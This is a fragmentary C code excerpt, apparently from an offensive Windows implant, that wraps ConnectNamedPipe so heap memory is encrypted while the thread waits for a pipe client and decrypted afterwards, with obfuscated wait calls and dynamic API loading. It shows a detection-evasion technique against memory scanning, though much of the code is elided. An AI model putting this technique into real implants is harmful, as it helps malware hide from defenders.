	...
	if ( NT_SUCCESS( Api.LdrLoadDll( NULL, 0, &Uni, &K32 ) ) ) {
		...
		if ( Asn ) 
		{
			...
			if ( NT_SUCCESS( Api.NtCreateEvent( &Ovl.hEvent, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ) {
				...
				/* Call the connect operation */
				Ret = Api.ConnectNamedPipe( hNamedPipe, &Ovl );
				...
				if ( Ret != TRUE ) {
					...
					if ( NtCurrentTeb()->LastErrorValue == ERROR_IO_PENDING ) {
						...
						/* Encrypt the heap blocks */
						HeapEncryptDecrypt( &Key, sizeof( Key ) );

						/* Block until the operation completes */
						Nst = ObfNtWaitForSingleObject( Ovl.hEvent, FALSE, NULL );

						/* Decrypt the heap blocks */
						HeapEncryptDecrypt( &Key, sizeof( Key ) );

						/* Get the result. */
						Ret = Api.GetOverlappedResult( hNamedPipe, &Ovl, &Len, FALSE );
					};
				};
		...
		{
			/* Execute ConnectNamedPipe as normal */
			Ret = Api.ConnectNamedPipe( hNamedPipe, lpOverlapped );
		};
